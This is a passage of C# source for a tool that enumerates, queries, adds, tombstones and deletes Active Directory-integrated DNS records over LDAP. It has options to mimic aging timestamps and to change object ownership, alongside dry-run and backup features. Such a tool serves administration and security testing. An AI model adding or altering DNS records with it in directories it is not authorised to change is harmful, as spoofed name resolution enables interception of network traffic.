                        Logger.Err("Zone not found: {0}", zoneDn);
                    else
                        ErrorReporter.PrintCom(err);
                    return ErrorReporter.ToExitCode(err);
                }

                if (!jsonMode)
                {
                    Logger.Info(opt, "Enumerating dnsNode objects under: {0}", zoneDn);
                    if (typeSet != null || nameRegex != null || opt.OnlyTombstoned || opt.NoTombstoned)
                        Logger.Info(opt, "Filters: type={0}  name={1}  tomb={2}",
                            typeSet != null ? opt.FilterType : "*",
                            nameRegex != null ? opt.FilterName : "*",
                            opt.OnlyTombstoned ? "only" : (opt.NoTombstoned ? "exclude" : "any"));
                }

                using (DirectorySearcher searcher = new DirectorySearcher(zone))
                {
                    searcher.Filter = "(objectClass=dnsNode)";
                    searcher.SearchScope = SearchScope.OneLevel;
                    searcher.PageSize = 1000;
                    searcher.PropertiesToLoad.Add("name");
                    searcher.PropertiesToLoad.Add("distinguishedName");
                    searcher.PropertiesToLoad.Add("dnsRecord");
                    searcher.PropertiesToLoad.Add("dNSTombstoned");

                    int fetched = 0, shown = 0, active = 0, tombstoned = 0;
                    StringBuilder json = null;
                    bool firstNode = true;
                    if (jsonMode)
                    {
                        json = new StringBuilder();
                        json.Append("{\"zone_dn\":\"").Append(Json.Escape(zoneDn)).Append("\",");
                        json.Append("\"nodes\":[");
                    }

                    using (SearchResultCollection results = searcher.FindAll())
                    {
                        foreach (SearchResult r in results)
                        {
                            fetched++;
                            string name = Prop(r, "name");
                            string tomb = Prop(r, "dNSTombstoned");
                            bool isTomb = tomb.Equals("True", StringComparison.OrdinalIgnoreCase);

                            if (opt.OnlyTombstoned && !isTomb) continue;
                            if (opt.NoTombstoned   &&  isTomb) continue;
                            if (nameRegex != null && !nameRegex.IsMatch(name)) continue;
                            if (typeSet != null && !HasMatchingTypeRecord(r, typeSet)) continue;

                            shown++;
                            if (isTomb) tombstoned++; else active++;

                            if (jsonMode)
                            {
                                if (!firstNode) json.Append(",");
                                firstNode = false;
                                json.Append("{");
                                json.AppendFormat("\"name\":\"{0}\",", Json.Escape(name));
                                json.AppendFormat("\"dn\":\"{0}\",", Json.Escape(Prop(r, "distinguishedName")));
                                json.AppendFormat("\"tombstoned\":{0},", isTomb ? "true" : "false");
                                json.Append("\"records\":[");
                                bool firstRec = true;
                                if (r.Properties.Contains("dnsRecord"))
                                {
                                    foreach (object o in r.Properties["dnsRecord"])
                                    {
                                        byte[] data = o as byte[];
                                        if (data == null) continue;
                                        if (!firstRec) json.Append(",");
                                        firstRec = false;
                                        WriteRecordJson(json, data);
                                    }
                                }
                                json.Append("]}");
                            }
                            else
                            {
                                Console.WriteLine();
                                Console.WriteLine("[+] {0}{1}", name, isTomb ? "  [TOMBSTONED]" : "");
                                if (opt.Verbose)
                                    Console.WriteLine("    DN: {0}", Prop(r, "distinguishedName"));

                                if (!r.Properties.Contains("dnsRecord") || r.Properties["dnsRecord"].Count == 0)
                                {
                                    Console.WriteLine("    <no records>");
                                    continue;
                                }

                                foreach (object o in r.Properties["dnsRecord"])
                                {
                                    byte[] data = o as byte[];
                                    if (data == null) continue;
                                    ushort t = DnsRecord.GetType(data);
                                    Console.WriteLine("    {0,-6} {1}", DnsRecord.TypeName(t), DnsRecord.SummaryLine(data));
                                }
                            }
                        }
                    }

                    if (jsonMode)
                    {
                        json.Append("],");
                        json.AppendFormat("\"summary\":{{\"fetched\":{0},\"shown\":{1},\"active\":{2},\"tombstoned\":{3}}}",
                            fetched, shown, active, tombstoned);
                        json.Append("}");
                        Console.WriteLine(json.ToString());
                    }
                    else
                    {
                        Console.WriteLine();
                        if (fetched != shown)
                            Logger.Ok("Shown: {0} nodes ({1} active, {2} tombstoned); {3} filtered out of {4} fetched",
                                shown, active, tombstoned, fetched - shown, fetched);
                        else
                            Logger.Ok("Total: {0} nodes ({1} active, {2} tombstoned)", shown, active, tombstoned);
                    }
                }
            }
            return ExitCodes.Success;
        }

        // ------------- query -------------
        public static int RunQuery(Options opt, string zoneDn)
        {
            if (opt.Format != "text" && opt.Format != "json")
                throw new ArgumentException("--format must be 'text' or 'json'");

            string nodeDn = "DC=" + LdapOps.EscapeRdn(opt.Name) + "," + zoneDn;
            Logger.Verbose(opt, "Node DN:    {0}", nodeDn);
            bool jsonMode = opt.Format == "json";

            using (DirectoryEntry node = LdapOps.Open(opt, nodeDn))
            {
                // Ask for the security descriptor up front so a later
                // ObjectSecurity access doesn't trigger a second LDAP query.
                node.Options.SecurityMasks = SecurityMasks.Owner |
                                             SecurityMasks.Group |
                                             SecurityMasks.Dacl;

                DirectoryServicesCOMException err;
                if (!LdapOps.TryBind(node, out err))
                {
                    if (ErrorReporter.IsNotFound(err))
                    {
                        Logger.Err("Node not found: {0}", nodeDn);
                        return ExitCodes.NotFound;
                    }
                    ErrorReporter.PrintCom(err);
                    return ErrorReporter.ToExitCode(err);
                }

                // Batch-load all attributes we'll read into a single LDAP
                // search instead of one search per property access.
                try
                {
                    node.RefreshCache(new[] {
                        "distinguishedName", "name", "dNSTombstoned",
                        "whenCreated", "whenChanged",
                        "dnsRecord", "nTSecurityDescriptor"
                    });
                }
                catch
                {
                    // If RefreshCache fails (e.g. access-denied on some attrs),
                    // fall back to lazy per-property loads. Not fatal.
                }

                if (jsonMode)
                {
                    WriteQueryJson(opt, node, nodeDn);
                    return ExitCodes.Success;
                }

                Logger.Ok("Found node");
                Logger.Ok("DN: {0}", nodeDn);

                PrintProperty(node, "distinguishedName");
                PrintProperty(node, "name");
                PrintProperty(node, "dNSTombstoned");
                PrintProperty(node, "whenCreated");
                PrintProperty(node, "whenChanged");

                if (!node.Properties.Contains("dnsRecord") || node.Properties["dnsRecord"].Count == 0)
                {
                    Logger.Info(opt, "dnsRecord: <empty>");
                    PrintNodePermissions(opt, node);
                    return ExitCodes.Success;
                }

                for (int i = 0; i < node.Properties["dnsRecord"].Count; i++)
                {
                    byte[] data = node.Properties["dnsRecord"][i] as byte[];
                    if (data == null) continue;

                    Console.WriteLine();
                    Console.WriteLine("[*] dnsRecord[{0}]", i);
                    if (opt.Verbose)
                        Console.WriteLine("    Base64: {0}", Convert.ToBase64String(data));
                    DnsRecord.Decode(data, "    ");
                }

                PrintNodePermissions(opt, node);
            }
            return ExitCodes.Success;
        }

        private static void WriteQueryJson(Options opt, DirectoryEntry node, string nodeDn)
        {
            StringBuilder json = new StringBuilder();
            json.Append("{");
            json.AppendFormat("\"dn\":\"{0}\",", Json.Escape(nodeDn));
            json.AppendFormat("\"name\":\"{0}\",", Json.Escape(PropOne(node, "name")));
            json.AppendFormat("\"dNSTombstoned\":{0},", IsTombstoned(node) ? "true" : "false");
            json.AppendFormat("\"whenCreated\":\"{0}\",", Json.Escape(PropOne(node, "whenCreated")));
            json.AppendFormat("\"whenChanged\":\"{0}\",", Json.Escape(PropOne(node, "whenChanged")));

            json.Append("\"records\":[");
            bool firstRec = true;
            if (node.Properties.Contains("dnsRecord"))
            {
                foreach (object o in node.Properties["dnsRecord"])
                {
                    byte[] data = o as byte[];
                    if (data == null) continue;
                    if (!firstRec) json.Append(",");
                    firstRec = false;
                    WriteRecordJson(json, data);
                }
            }
            json.Append("],");

            // Permissions
            json.Append("\"permissions\":");
            WritePermissionsJson(json, node);

            json.Append("}");
            Console.WriteLine(json.ToString());
        }

        private static void WritePermissionsJson(StringBuilder json, DirectoryEntry node)
        {
            ActiveDirectorySecurity sec;
            try { sec = node.ObjectSecurity; }
            catch { json.Append("null"); return; }
            if (sec == null) { json.Append("null"); return; }

            json.Append("{");

            string owner = null;
            try
            {
                IdentityReference o = sec.GetOwner(typeof(NTAccount));
                if (o != null) owner = o.Value;
            }
            catch { /* ignored */ }
            json.AppendFormat("\"owner\":{0},",
                owner == null ? "null" : "\"" + Json.Escape(owner) + "\"");

            AuthorizationRuleCollection rules;
            try { rules = sec.GetAccessRules(true, true, typeof(NTAccount)); }
            catch { json.Append("\"aces\":[]}"); return; }

            int explicitCount = 0, inheritedCount = 0;
            json.Append("\"aces\":[");
            bool first = true;
            foreach (AuthorizationRule rule in rules)
            {
                ActiveDirectoryAccessRule ar = rule as ActiveDirectoryAccessRule;
                if (ar == null) continue;
                if (ar.IsInherited) inheritedCount++;
                else                explicitCount++;
                if (!first) json.Append(",");
                first = false;
                string id = ar.IdentityReference != null ? ar.IdentityReference.Value : null;
                json.Append("{");
                json.AppendFormat("\"type\":\"{0}\",", ar.AccessControlType);
                json.AppendFormat("\"trustee\":{0},",
                    id == null ? "null" : "\"" + Json.Escape(id) + "\"");
                json.AppendFormat("\"rights\":\"{0}\",", Json.Escape(ar.ActiveDirectoryRights.ToString()));
                json.AppendFormat("\"inherited\":{0}", ar.IsInherited ? "true" : "false");
                json.Append("}");
            }
            json.Append("],");
            json.AppendFormat("\"explicit_count\":{0},\"inherited_count\":{1}",
                explicitCount, inheritedCount);
            json.Append("}");
        }

        private static string PropOne(DirectoryEntry e, string name)
        {
            if (!e.Properties.Contains(name) || e.Properties[name].Count == 0) return "";
            return e.Properties[name][0].ToString();
        }

        // ------------- add -------------
        public static int RunAdd(Options opt, string zoneDn)
        {
            byte[] record;
            ushort recordType;
            string dataDesc;

            if (!string.IsNullOrWhiteSpace(opt.RawBase64))
            {
                try
                {
                    record = Convert.FromBase64String(opt.RawBase64);
                }
                catch (FormatException)
                {
                    throw new ArgumentException("--raw is not valid base64");
                }
                if (record.Length < 24)
                    throw new ArgumentException("--raw record is too short (need >= 24 bytes of header)");
                recordType = DnsRecord.GetType(record);
                dataDesc = string.Format("<raw {0}-byte {1} record>", record.Length, DnsRecord.TypeName(recordType));
            }
            else
            {
                string t = opt.RecordType.ToUpperInvariant();
                uint ts = opt.MimicAging ? DnsRecord.AgingTimestampNow() : 0u;
                IPAddress ip;
                switch (t)
                {
                    case "A":
                        if (!IPAddress.TryParse(opt.Data, out ip) || ip.AddressFamily != AddressFamily.InterNetwork)
                            throw new ArgumentException("--type A requires an IPv4 address in --data");
                        record = DnsRecord.BuildA(ip, opt.Ttl, ts);
                        recordType = DnsRecord.TypeA;
                        dataDesc = ip.ToString();
                        break;
                    case "AAAA":
                        if (!IPAddress.TryParse(opt.Data, out ip) || ip.AddressFamily != AddressFamily.InterNetworkV6)
                            throw new ArgumentException("--type AAAA requires an IPv6 address in --data");
                        record = DnsRecord.BuildAaaa(ip, opt.Ttl, ts);
                        recordType = DnsRecord.TypeAaaa;
                        dataDesc = ip.ToString();
                        break;
                    case "CNAME":
                        record = DnsRecord.BuildCname(opt.Data, opt.Ttl, ts);
                        recordType = DnsRecord.TypeCname;
                        dataDesc = opt.Data;
                        break;
                    case "TXT":
                        record = DnsRecord.BuildTxt(opt.Data, opt.Ttl, ts);
                        recordType = DnsRecord.TypeTxt;
                        dataDesc = "\"" + opt.Data + "\"";
                        break;
                    case "PTR":
                        if (string.IsNullOrWhiteSpace(opt.Data))
                            throw new ArgumentException("--type PTR requires --data <target FQDN>");
                        record = DnsRecord.BuildPtr(opt.Data, opt.Ttl, ts);
                        recordType = DnsRecord.TypePtr;
                        dataDesc = opt.Data;
                        break;
                    case "SRV":
                        if (string.IsNullOrWhiteSpace(opt.Data))
                            throw new ArgumentException("--type SRV requires --data <target FQDN>");
                        if (opt.SrvPort < 0)
                            throw new ArgumentException("--type SRV requires --srv-port <0..65535>");
                        record = DnsRecord.BuildSrv((ushort)opt.SrvPriority,
                                                    (ushort)opt.SrvWeight,
                                                    (ushort)opt.SrvPort,
                                                    opt.Data, opt.Ttl, ts);
                        recordType = DnsRecord.TypeSrv;
                        dataDesc = string.Format("{0} {1} {2} {3}",
                            opt.SrvPriority, opt.SrvWeight, opt.SrvPort, opt.Data);
                        break;
                    case "MX":
                        if (string.IsNullOrWhiteSpace(opt.Data))
                            throw new ArgumentException("--type MX requires --data <exchange FQDN>");
                        record = DnsRecord.BuildMx((ushort)opt.MxPref, opt.Data, opt.Ttl, ts);
                        recordType = DnsRecord.TypeMx;
                        dataDesc = string.Format("{0} {1}", opt.MxPref, opt.Data);
                        break;
                    default:
                        throw new ArgumentException(
                            "Unsupported --type: " + opt.RecordType +
                            " (expected A, AAAA, CNAME, TXT, PTR, SRV, MX, or use --raw)");
                }
            }

            string nodeRdn = "DC=" + LdapOps.EscapeRdn(opt.Name);
            string nodeDn  = nodeRdn + "," + zoneDn;
            Logger.Verbose(opt, "Node DN:    {0}", nodeDn);
            Logger.Verbose(opt, "Record hex: {0}", BitConverter.ToString(record).Replace("-", ""));

            using (DirectoryEntry zone = LdapOps.Open(opt, zoneDn))
            {
                DirectoryServicesCOMException zoneErr;
                if (!LdapOps.TryBind(zone, out zoneErr))
                {
                    if (ErrorReporter.IsNotFound(zoneErr))
                        Logger.Err("Zone not found: {0}", zoneDn);
                    else
                        ErrorReporter.PrintCom(zoneErr);
                    return ErrorReporter.ToExitCode(zoneErr);
                }

                bool nodeExists;
                using (DirectoryEntry node = LdapOps.Open(opt, nodeDn))
                {
                    DirectoryServicesCOMException nodeErr;
                    if (LdapOps.TryBind(node, out nodeErr))
                    {
                        nodeExists = true;
                        if (opt.Force && opt.Append)
                        {
                            Logger.Err("--force and --append are mutually exclusive");
                            return ExitCodes.UsageError;
                        }
                        if (!opt.Force && !opt.Append)
                        {
                            Logger.Err("Node already exists: {0}", nodeDn);
                            Logger.Err("Use --force to replace records of type {0} on this node,",
                                DnsRecord.TypeName(recordType));
                            Logger.Err("or --append to add this record alongside the existing ones.");
                            return ExitCodes.UsageError;
                        }
                        if (opt.Append && IsTombstoned(node))
                        {
                            Logger.Err("--append refuses on tombstoned node: use --force to un-tombstone");
                            return ExitCodes.UsageError;
                        }

                        if (opt.DryRun)
                        {
                            PrintAddPlan(opt, nodeDn, record, recordType, dataDesc, node, opt.Append);
                            return ExitCodes.Success;
                        }

                        if (!Safety.ConfirmIfHighRisk(opt, node))
                            return ExitCodes.UsageError;

                        NodeSnapshot prev = CaptureNodeState(node);
                        Backup.Snapshot(opt, nodeDn,
                            opt.Append ? "add(append)" : "add(force-replace)", prev);

                        if (opt.Append)
                        {
                            node.Properties["dnsRecord"].Add(record);
                            node.CommitChanges();
                        }
                        else
                        {
                            // B1 fix: preserve other record types on the same node
                            ReplaceSameTypeRecord(node, record, recordType);
                            SetTombstoneFalse(node);
                            node.CommitChanges();
                        }

                        SetOwnerResult ownerResult = MaybeSetOwner(opt, node);

                        if (opt.Format == "json")
                        {
                            EmitAddReceipt(opt, nodeDn, record, recordType, dataDesc, prev,
                                opt.Append ? "append" : "replace", ownerResult);
                        }
                        else
                        {
                            Logger.Ok(opt.Append
                                ? "Appended {0} record (existing records kept)"
                                : "Updated {0} record",
                                DnsRecord.TypeName(recordType));
                            Logger.Ok("{0}.{1} -> {2}", opt.Name, opt.Zone, dataDesc);
                            Logger.Ok("DN: {0}", nodeDn);
                            if (ownerResult.Attempted && ownerResult.Success)
                                Logger.Ok("Owner set to: {0} ({1})", ownerResult.Requested, ownerResult.AppliedSid);
                        }
                        return ExitCodes.Success;
                    }

                    // B2 fix: only fall through to "create" when the node is truly absent;
                    // for ACCESS_DENIED / SERVER_DOWN / etc. bail out with the real error.
                    if (!ErrorReporter.IsNotFound(nodeErr))
                    {
                        ErrorReporter.PrintCom(nodeErr);
                        return ErrorReporter.ToExitCode(nodeErr);
                    }
                    nodeExists = false;
                }

                if (!nodeExists)
                {
                    if (opt.DryRun)
                    {
                        PrintAddPlan(opt, nodeDn, record, recordType, dataDesc, null, false);
                        return ExitCodes.Success;
                    }

                    if (!Safety.ConfirmIfHighRisk(opt, null))
                        return ExitCodes.UsageError;

                    using (DirectoryEntry newNode = zone.Children.Add(nodeRdn, "dnsNode"))
                    {
                        newNode.Properties["dnsRecord"].Add(record);
                        newNode.Properties["dNSTombstoned"].Add(false);
                        newNode.CommitChanges();

                        SetOwnerResult ownerResult = MaybeSetOwner(opt, newNode);

                        if (opt.Format == "json")
                        {
                            EmitAddReceipt(opt, nodeDn, record, recordType, dataDesc, null, "create", ownerResult);
                        }
                        else
                        {
                            Logger.Ok("Added {0} record", DnsRecord.TypeName(recordType));
                            Logger.Ok("{0}.{1} -> {2}", opt.Name, opt.Zone, dataDesc);
                            Logger.Ok("DN: {0}", nodeDn);
                            if (ownerResult.Attempted && ownerResult.Success)
                                Logger.Ok("Owner set to: {0} ({1})", ownerResult.Requested, ownerResult.AppliedSid);
                        }
                    }
                }
            }
            return ExitCodes.Success;
        }

        private static void ReplaceSameTypeRecord(DirectoryEntry node, byte[] newRecord, ushort recordType)
        {
            List<byte[]> keep = new List<byte[]>();
            if (node.Properties.Contains("dnsRecord"))
            {
                foreach (object o in node.Properties["dnsRecord"])
                {
                    byte[] b = o as byte[];
                    if (b == null) continue;
                    ushort t = DnsRecord.GetType(b);
                    if (t == recordType) continue;            // drop same type
                    if (t == DnsRecord.TypeZero) continue;    // drop stale tombstone TS records
                    keep.Add(b);
                }
            }
            node.Properties["dnsRecord"].Clear();
            foreach (byte[] b in keep)
                node.Properties["dnsRecord"].Add(b);
            node.Properties["dnsRecord"].Add(newRecord);
        }

        // ------------- disable (tombstone) -------------
        public static int RunDisable(Options opt, string zoneDn)
        {
            string nodeDn = "DC=" + LdapOps.EscapeRdn(opt.Name) + "," + zoneDn;
            Logger.Verbose(opt, "Node DN:    {0}", nodeDn);

            using (DirectoryEntry node = LdapOps.Open(opt, nodeDn))
            {
                DirectoryServicesCOMException err;
                if (!LdapOps.TryBind(node, out err))
                {
                    if (ErrorReporter.IsNotFound(err))
                    {
                        Logger.Err("Node not found: {0}", nodeDn);
                        return ExitCodes.NotFound;
                    }
                    ErrorReporter.PrintCom(err);
                    return ErrorReporter.ToExitCode(err);
                }

                if (opt.DryRun)
                {
                    PrintDisablePlan(opt, nodeDn, node);
                    return ExitCodes.Success;
                }

                NodeSnapshot prev = CaptureNodeState(node);
                Backup.Snapshot(opt, nodeDn, "disable", prev);

                byte[] tomb = DnsRecord.BuildTombstone();
                node.Properties["dnsRecord"].Clear();
                node.Properties["dnsRecord"].Add(tomb);

                if (node.Properties.Contains("dNSTombstoned"))
                    node.Properties["dNSTombstoned"].Value = true;
                else
                    node.Properties["dNSTombstoned"].Add(true);

                node.CommitChanges();

                if (opt.Format == "json")
                {
                    EmitDisableReceipt(opt, nodeDn, prev);
                }
                else
                {
                    Logger.Ok("Tombstoned node (soft delete)");
                    Logger.Ok("DN: {0}", nodeDn);
                    Logger.Info(opt, "The dnsNode object remains; DNS scavenging removes it after the");
                    Logger.Info(opt, "DsTombstoneInterval (default 14 days on Server 2008+).");
                }
            }
            return ExitCodes.Success;
        }

        // ------------- remove (hard delete) -------------
        public static int RunRemove(Options opt, string zoneDn)
        {
            string nodeDn = "DC=" + LdapOps.EscapeRdn(opt.Name) + "," + zoneDn;
            Logger.Verbose(opt, "Node DN:    {0}", nodeDn);

            int comma = nodeDn.IndexOf(',');
            if (comma < 0)
                throw new ArgumentException("Invalid DN: " + nodeDn);
            string parentDn = nodeDn.Substring(comma + 1);

            using (DirectoryEntry parent = LdapOps.Open(opt, parentDn))
            {
                DirectoryServicesCOMException parentErr;
                if (!LdapOps.TryBind(parent, out parentErr))
                {
                    if (ErrorReporter.IsNotFound(parentErr))
                        Logger.Err("Parent (zone) not found: {0}", parentDn);
                    else
                        ErrorReporter.PrintCom(parentErr);
                    return ErrorReporter.ToExitCode(parentErr);
                }

                using (DirectoryEntry node = LdapOps.Open(opt, nodeDn))
                {
                    DirectoryServicesCOMException err;
                    // B5 fix: distinguish not-found from access-denied
                    if (!LdapOps.TryBind(node, out err))
                    {
                        if (ErrorReporter.IsNotFound(err))
                        {
                            Logger.Err("Node not found: {0}", nodeDn);
                            return ExitCodes.NotFound;
                        }
                        ErrorReporter.PrintCom(err);
                        return ErrorReporter.ToExitCode(err);
                    }

                    if (opt.DryRun)
                    {
                        PrintRemovePlan(opt, nodeDn, node);
                        return ExitCodes.Success;
                    }

                    if (!Safety.ConfirmIfHighRisk(opt, node))
                        return ExitCodes.UsageError;

                    NodeSnapshot prev = CaptureNodeState(node);
                    Backup.Snapshot(opt, nodeDn, "remove", prev);

                    parent.Children.Remove(node);
                    parent.CommitChanges();

                    if (opt.Format == "json")
                    {
                        EmitRemoveReceipt(opt, nodeDn, prev);
                    }
                    else
                    {
                        Logger.Ok("Removed node (hard delete)");
                        Logger.Ok("DN: {0}", nodeDn);
                    }
                }
            }
            return ExitCodes.Success;
        }

        private static void SetTombstoneFalse(DirectoryEntry node)
        {
            if (node.Properties.Contains("dNSTombstoned"))
                node.Properties["dNSTombstoned"].Value = false;
            else
                node.Properties["dNSTombstoned"].Add(false);
        }

        private static void PrintProperty(DirectoryEntry entry, string name)
        {
            if (!entry.Properties.Contains(name) || entry.Properties[name].Count == 0)
            {
                Console.WriteLine("[*] {0}: <empty>", name);
                return;
            }

            Console.Write("[*] {0}: ", name);
            for (int i = 0; i < entry.Properties[name].Count; i++)
            {
                if (i > 0) Console.Write(", ");
                object value = entry.Properties[name][i];
                byte[] bytes = value as byte[];
                if (bytes != null)
                    Console.Write(Convert.ToBase64String(bytes));
                else
                    Console.Write(value);
            }
            Console.WriteLine();
        }

        private static string Prop(SearchResult r, string name)
        {
            if (!r.Properties.Contains(name) || r.Properties[name].Count == 0) return "";
            return r.Properties[name][0].ToString();
        }

        // -------- dry-run plan printers --------
        private static void PrintAddPlan(Options opt, string nodeDn, byte[] newRecord,
                                         ushort recordType, string dataDesc,
                                         DirectoryEntry existingNode, bool appendMode)
        {
            bool nodeExists = existingNode != null;
            string mode;
            if (!nodeExists)
                mode = "create new dnsNode";
            else if (appendMode)
                mode = "append " + DnsRecord.TypeName(recordType) + " to existing node";
            else
                mode = "replace same-type " + DnsRecord.TypeName(recordType) + " on existing node";

            Console.WriteLine("[dry-run] add ({0}):", mode);
            Console.WriteLine("[dry-run]   DN:        {0}", nodeDn);
            Console.WriteLine("[dry-run]   {0}.{1} -> {2}", opt.Name, opt.Zone, dataDesc);
            Console.WriteLine("[dry-run]   New:       {0,-6} {1}",
                DnsRecord.TypeName(recordType), DnsRecord.SummaryLine(newRecord));
            Console.WriteLine("[dry-run]   Blob:      {0} ({1} bytes)",
                BitConverter.ToString(newRecord).Replace("-", ""), newRecord.Length);
            if (nodeExists)
            {
                int existingCount = existingNode.Properties.Contains("dnsRecord")
                    ? existingNode.Properties["dnsRecord"].Count : 0;
                if (appendMode)
                    Console.WriteLine("[dry-run]   Existing:  {0} record(s) on node (all preserved)", existingCount);
                else
                    Console.WriteLine("[dry-run]   Existing:  {0} record(s) on node (other types preserved)",
                        existingCount);
                if (IsTombstoned(existingNode))
                    Console.WriteLine("[dry-run]   Note:      node is currently TOMBSTONED; --force would un-tombstone");
            }
            Console.WriteLine("[dry-run] No AD write performed.");
        }

        private static void PrintDisablePlan(Options opt, string nodeDn, DirectoryEntry node)
        {
            int existing = node.Properties.Contains("dnsRecord") ? node.Properties["dnsRecord"].Count : 0;
            Console.WriteLine("[dry-run] disable (tombstone):");
            Console.WriteLine("[dry-run]   DN:                {0}", nodeDn);
            Console.WriteLine("[dry-run]   Drop:              {0} record(s)", existing);
            Console.WriteLine("[dry-run]   dNSTombstoned ->   True");
            byte[] tomb = DnsRecord.BuildTombstone();
            Console.WriteLine("[dry-run]   Tombstone blob:    {0} ({1} bytes)",
                BitConverter.ToString(tomb).Replace("-", ""), tomb.Length);
            Console.WriteLine("[dry-run] No AD write performed.");
        }

        private static void PrintRemovePlan(Options opt, string nodeDn, DirectoryEntry node)
        {
            int existing = node.Properties.Contains("dnsRecord") ? node.Properties["dnsRecord"].Count : 0;
            Console.WriteLine("[dry-run] remove (hard delete):");
            Console.WriteLine("[dry-run]   DN:           {0}", nodeDn);
            Console.WriteLine("[dry-run]   Records lost: {0}", existing);
            Console.WriteLine("[dry-run] No AD write performed.");
        }

        internal static bool IsTombstoned(DirectoryEntry node)
        {
            if (!node.Properties.Contains("dNSTombstoned")) return false;
            if (node.Properties["dNSTombstoned"].Value == null) return false;
            bool v;
            return bool.TryParse(node.Properties["dNSTombstoned"].Value.ToString(), out v) && v;
        }

        // -------- pre-modification state capture (for backup + receipt) --------
        internal sealed class NodeSnapshot
        {
            public bool Tombstoned;
            public List<byte[]> Records = new List<byte[]>();
        }

        internal sealed class SetOwnerResult
        {
            public bool   Attempted;
            public string Requested;
            public bool   Success;
            public string AppliedSid;
            public string Error;
        }

        internal static NodeSnapshot CaptureNodeState(DirectoryEntry node)
        {
            NodeSnapshot s = new NodeSnapshot();
            s.Tombstoned = IsTombstoned(node);
            if (node.Properties.Contains("dnsRecord"))
            {
                foreach (object o in node.Properties["dnsRecord"])
                {
                    byte[] b = o as byte[];
                    if (b != null) s.Records.Add(b);
                }
            }
            return s;
        }

        internal static SetOwnerResult MaybeSetOwner(Options opt, DirectoryEntry node)
        {
            SetOwnerResult r = new SetOwnerResult();
            if (string.IsNullOrEmpty(opt.SetOwner)) return r;

            r.Attempted = true;
            r.Requested = opt.SetOwner;

            try
            {
                IdentityReference owner;
                if (opt.SetOwner.StartsWith("S-1-", StringComparison.OrdinalIgnoreCase))
                {
                    SecurityIdentifier sid = new SecurityIdentifier(opt.SetOwner);
                    r.AppliedSid = sid.Value;
                    owner = sid;
                }
                else
                {
                    NTAccount acct = new NTAccount(opt.SetOwner);
                    try
                    {
                        r.AppliedSid = ((SecurityIdentifier)acct.Translate(typeof(SecurityIdentifier))).Value;
                    }
                    catch { /* not fatal -- SetOwner can still take NTAccount */ }
                    owner = acct;
                }

                ActiveDirectorySecurity sec = node.ObjectSecurity;
                sec.SetOwner(owner);
                node.CommitChanges();
                r.Success = true;
            }
            catch (Exception ex)
            {
                r.Success = false;
                r.Error = ex.Message;
                Logger.Warn("--set-owner failed: {0}", ex.Message);
            }

            return r;
        }

        // -------- enum filter helpers --------
        private static HashSet<ushort> ParseTypeFilter(string spec)
        {
            if (string.IsNullOrWhiteSpace(spec)) return null;
            HashSet<ushort> set = new HashSet<ushort>();
            foreach (string token in spec.Split(','))
            {
                string t = token.Trim();
                if (t.Length == 0) continue;
                set.Add(ParseTypeName(t));
            }
            return set.Count == 0 ? null : set;
        }

        private static ushort ParseTypeName(string s)
        {
            switch (s.ToUpperInvariant())
            {
                case "A":     return DnsRecord.TypeA;
                case "AAAA":  return DnsRecord.TypeAaaa;
                case "CNAME": return DnsRecord.TypeCname;
                case "PTR":   return DnsRecord.TypePtr;
                case "SRV":   return DnsRecord.TypeSrv;
                case "MX":    return DnsRecord.TypeMx;
                case "NS":    return DnsRecord.TypeNs;
                case "TXT":   return DnsRecord.TypeTxt;
                case "SOA":   return DnsRecord.TypeSoa;
                case "TS":    return DnsRecord.TypeZero;
                default:
                    throw new ArgumentException("Unknown record type for --filter-type: " + s);
            }
        }

        private static Regex GlobToRegex(string glob)
        {
            StringBuilder sb = new StringBuilder("^");
            foreach (char c in glob)
            {
                switch (c)
                {
                    case '*': sb.Append(".*"); break;
                    case '?': sb.Append('.');  break;
                    case '\\': case '+': case '(': case ')': case '|':
                    case '^': case '$': case '.': case '{': case '}':
                    case '[': case ']':
                        sb.Append('\\').Append(c); break;
                    default: sb.Append(c); break;
                }
            }
            sb.Append('$');
            return new Regex(sb.ToString(), RegexOptions.IgnoreCase);
        }

        private static bool HasMatchingTypeRecord(SearchResult r, HashSet<ushort> typeSet)
        {
            if (!r.Properties.Contains("dnsRecord")) return false;
            foreach (object o in r.Properties["dnsRecord"])
            {
                byte[] b = o as byte[];
                if (b == null) continue;
                ushort t = DnsRecord.GetType(b);
                if (typeSet.Contains(t)) return true;
            }
            return false;
        }

        // -------- json output helpers --------
        internal static void WriteRecordJson(StringBuilder sb, byte[] data)
        {
            if (data == null || data.Length < 24)
            {
                sb.Append("{\"error\":\"record too short\"}");
                return;
            }
            ushort type   = DnsRecord.GetType(data);
            ushort dataLen = Bin.ReadU16Le(data, 0);
            uint   ttl    = Bin.ReadU32Be(data, 12);
            uint   timestamp = Bin.ReadU32Le(data, 20);

            sb.Append("{");
            sb.AppendFormat("\"type\":\"{0}\",", DnsRecord.TypeName(type));
            sb.AppendFormat("\"type_id\":{0},", type);
            sb.AppendFormat("\"ttl\":{0},", ttl);
            sb.AppendFormat("\"timestamp\":{0},", timestamp);

            switch (type)
            {
                case DnsRecord.TypeA:
                    if (data.Length >= 28)
                        sb.AppendFormat("\"ipv4\":\"{0}.{1}.{2}.{3}\",",
                            data[24], data[25], data[26], data[27]);
                    break;
                case DnsRecord.TypeAaaa:
                    if (data.Length >= 40)
                    {
                        byte[] addr = new byte[16];
                        Buffer.BlockCopy(data, 24, addr, 0, 16);
                        sb.AppendFormat("\"ipv6\":\"{0}\",", new IPAddress(addr));
                    }
                    break;
                case DnsRecord.TypeCname:
                case DnsRecord.TypePtr:
                case DnsRecord.TypeNs:
                    sb.AppendFormat("\"target\":\"{0}\",", Json.Escape(DnsRecord.DecodeCountName(data, 24)));
                    break;
                case DnsRecord.TypeTxt:
                    sb.AppendFormat("\"text\":\"{0}\",", Json.Escape(DnsRecord.DecodeTxt(data, 24, dataLen)));
                    break;
                case DnsRecord.TypeSrv:
                    if (data.Length >= 30)
                    {
                        sb.AppendFormat("\"priority\":{0},", Bin.ReadU16Be(data, 24));
                        sb.AppendFormat("\"weight\":{0},",   Bin.ReadU16Be(data, 26));
                        sb.AppendFormat("\"port\":{0},",     Bin.ReadU16Be(data, 28));
                        sb.AppendFormat("\"target\":\"{0}\",", Json.Escape(DnsRecord.DecodeCountName(data, 30)));
                    }
                    break;
                case DnsRecord.TypeMx:
                    if (data.Length >= 26)
                    {
                        sb.AppendFormat("\"preference\":{0},", Bin.ReadU16Be(data, 24));
                        sb.AppendFormat("\"exchange\":\"{0}\",", Json.Escape(DnsRecord.DecodeCountName(data, 26)));
                    }
                    break;
                case DnsRecord.TypeZero:
